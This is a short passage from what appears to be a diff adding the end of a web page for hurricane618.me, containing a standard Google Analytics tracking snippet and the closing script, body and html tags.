+ga('create', 'UA-121933059-1', 'hurricane618.me');  
+ga('send', 'pageview');
+</script>
+
+
+  </body>
+</html>
